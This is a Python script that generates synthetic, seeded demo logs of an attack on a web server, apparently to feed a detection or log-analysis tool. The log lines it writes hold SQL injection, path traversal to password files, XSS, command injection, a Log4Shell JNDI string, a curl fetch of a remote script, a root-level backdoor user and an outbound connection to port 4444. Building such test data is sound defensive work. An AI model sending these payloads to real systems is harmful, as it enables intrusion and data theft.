"""Generate the demo attack scenario logs (deterministic, seeded).

Story: an attacker (192.0.2.77) scans the web server and probes the app with sqlmap,
SQL injection, path traversal and a Log4Shell string, while a second host (203.0.113.45)
brute-forces SSH, gets in as `admin`, escalates with sudo, adds a backdoor user and opens
an outbound connection to 203.0.113.99:4444. Normal users generate background noise.

    python samples/generate_logs.py
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta
from pathlib import Path

OUT = Path(__file__).parent / "logs"
HOST = "web-01"
START = datetime(2026, 10, 9, 9, 0, 0)
NORMAL_IPS = [f"198.51.100.{i}" for i in (10, 11, 12, 23, 42)]
USERS = ["alice", "bob", "deploy"]
PAGES = ["/", "/products", "/products/12", "/login", "/static/app.js", "/static/style.css", "/api/items?page=2"]
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0 Safari/537.36"


def syslog_ts(t: datetime) -> str:
    return t.strftime("%b %d %H:%M:%S").replace(" 0", "  ", 1) if t.day < 10 else t.strftime("%b %d %H:%M:%S")


def nginx_ts(t: datetime) -> str:
    return t.strftime("%d/%b/%Y:%H:%M:%S +0000")


def main() -> None:
    rnd = random.Random(7)
    OUT.mkdir(exist_ok=True)
    auth: list[tuple[datetime, str]] = []
    web: list[tuple[datetime, str]] = []
    fw: list[tuple[datetime, str]] = []
    pid = 4000

    def sshd(t: datetime, msg: str) -> None:
        nonlocal pid
        pid += 1
        auth.append((t, f"{syslog_ts(t)} {HOST} sshd[{pid}]: {msg}"))

    # Background: normal SSH and web activity throughout the morning.
    for i in range(40):
        t = START + timedelta(minutes=rnd.randint(0, 180), seconds=rnd.randint(0, 59))
        user, ip = rnd.choice(USERS), rnd.choice(NORMAL_IPS)
        if i % 9 == 0:
            sshd(t, f"Failed password for {user} from {ip} port {rnd.randint(40000, 60000)} ssh2")
            t += timedelta(seconds=20)
        sshd(t, f"Accepted publickey for {user} from {ip} port {rnd.randint(40000, 60000)} ssh2: ED25519 SHA256:k3y{i}")
    for _ in range(220):
        t = START + timedelta(minutes=rnd.randint(0, 180), seconds=rnd.randint(0, 59))
        ip, page = rnd.choice(NORMAL_IPS), rnd.choice(PAGES)
        status = 200 if rnd.random() > 0.03 else 404
        web.append((t, f'{ip} - - [{nginx_ts(t)}] "GET {page} HTTP/1.1" {status} {rnd.randint(300, 9000)} "-" "{UA}"'))

    # 1) Port scan from 192.0.2.77 (09:41).
    t = START + timedelta(minutes=41)
    for port in [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 27017]:
        t += timedelta(milliseconds=rnd.randint(50, 400))
        action = "ALLOW" if port in (22, 80, 443) else "BLOCK"
        fw.append((t, f"{syslog_ts(t)} {HOST} kernel: [UFW {action}] IN=eth0 OUT= SRC=192.0.2.77 DST=10.0.0.5 PROTO=TCP SPT={rnd.randint(40000, 60000)} DPT={port} SYN"))

    # 2) Web vulnerability scanning and exploitation attempts (09:44 - 09:52).
    t = START + timedelta(minutes=44)
    attacks = [
        ("GET /admin HTTP/1.1", 404, "sqlmap/1.8.4#stable (https://sqlmap.org)"),
        ("GET /.env HTTP/1.1", 404, "sqlmap/1.8.4#stable (https://sqlmap.org)"),
        ("GET /wp-login.php HTTP/1.1", 404, "Nikto/2.5.0"),
        ("GET /phpmyadmin/ HTTP/1.1", 404, "Nikto/2.5.0"),
        ("GET /products?id=12%27%20OR%20%271%27=%271 HTTP/1.1", 500, "sqlmap/1.8.4#stable (https://sqlmap.org)"),
        ("GET /products?id=12%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1", 200, "sqlmap/1.8.4#stable (https://sqlmap.org)"),
        ("GET /products?id=12;DROP%20TABLE%20users-- HTTP/1.1", 500, "sqlmap/1.8.4#stable (https://sqlmap.org)"),
        ("GET /download?file=../../../../etc/passwd HTTP/1.1", 200, "curl/8.5.0"),
        ("GET /download?file=..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1", 403, "curl/8.5.0"),
        ("GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1", 200, "curl/8.5.0"),
        ("GET /api/ping?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1", 200, "curl/8.5.0"),
    ]
    for _ in range(25):  # directory brute force noise
        t += timedelta(seconds=rnd.randint(1, 4))
        path = rnd.choice(["/backup.zip", "/config.php", "/old/", "/test/", "/.git/config", "/server-status", "/api/v1/debug"])
        web.append((t, f'192.0.2.77 - - [{nginx_ts(t)}] "GET {path} HTTP/1.1" 404 153 "-" "Nikto/2.5.0"'))
    for req, status, agent in attacks:
        t += timedelta(seconds=rnd.randint(5, 30))
        web.append((t, f'192.0.2.77 - - [{nginx_ts(t)}] "{req}" {status} {rnd.randint(150, 4000)} "-" "{agent}"'))
    t += timedelta(seconds=40)
    web.append((t, f'192.0.2.77 - - [{nginx_ts(t)}] "GET / HTTP/1.1" 200 5120 "-" "${{jndi:ldap://192.0.2.77:1389/Exploit}}"'))

    # 3) SSH brute force + spray from 203.0.113.45 (10:05 - 10:09), then success as admin.
    t = START + timedelta(hours=1, minutes=5)
    for _ in range(38):
        t += timedelta(seconds=rnd.randint(2, 6))
        sshd(t, f"Failed password for admin from 203.0.113.45 port {rnd.randint(40000, 60000)} ssh2")
    for user in ["root", "oracle", "test", "ubuntu", "postgres", "git", "guest", "support"]:
        t += timedelta(seconds=rnd.randint(2, 5))
        prefix = "" if user == "root" else "invalid user "
        sshd(t, f"Failed password for {prefix}{user} from 203.0.113.45 port {rnd.randint(40000, 60000)} ssh2")
    t += timedelta(seconds=4)
    sshd(t, "Accepted password for admin from 203.0.113.45 port 51122 ssh2")
    auth.append((t, f"{syslog_ts(t)} {HOST} systemd-logind[612]: New session 77 of user admin."))

    # 4) Post-exploitation: sudo, backdoor account, outbound connection.
    t += timedelta(minutes=1)
    auth.append((t, f"{syslog_ts(t)} {HOST} sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash"))
    t += timedelta(seconds=40)
    auth.append((t, f"{syslog_ts(t)} {HOST} useradd[9121]: new user: name=sysupdate, UID=0, GID=0, home=/root, shell=/bin/bash"))
    t += timedelta(seconds=15)
    auth.append((t, f"{syslog_ts(t)} {HOST} sudo:    admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://203.0.113.99/x.sh"))
    t += timedelta(seconds=30)
    fw.append((t, f"{syslog_ts(t)} {HOST} kernel: [UFW ALLOW] IN= OUT=eth0 SRC=10.0.0.5 DST=203.0.113.99 PROTO=TCP SPT=43122 DPT=4444 SYN"))
    t += timedelta(minutes=3)
    fw.append((t, f"{syslog_ts(t)} {HOST} kernel: [UFW ALLOW] IN= OUT=eth0 SRC=10.0.0.5 DST=203.0.113.99 PROTO=TCP SPT=43180 DPT=4444 LEN=1460 BYTES=48211904"))

    # Background firewall noise.
    for _ in range(30):
        t = START + timedelta(minutes=rnd.randint(0, 180), seconds=rnd.randint(0, 59))
        ip = rnd.choice(NORMAL_IPS)
        fw.append((t, f"{syslog_ts(t)} {HOST} kernel: [UFW ALLOW] IN=eth0 OUT= SRC={ip} DST=10.0.0.5 PROTO=TCP SPT={rnd.randint(40000, 60000)} DPT=443 SYN"))

    for name, rows in (("auth.log", auth), ("nginx_access.log", web), ("firewall.log", fw)):
        rows.sort(key=lambda r: r[0])
        (OUT / name).write_text("\n".join(line for _, line in rows) + "\n")
        print(f"wrote {name}: {len(rows)} lines")


if __name__ == "__main__":
    main()
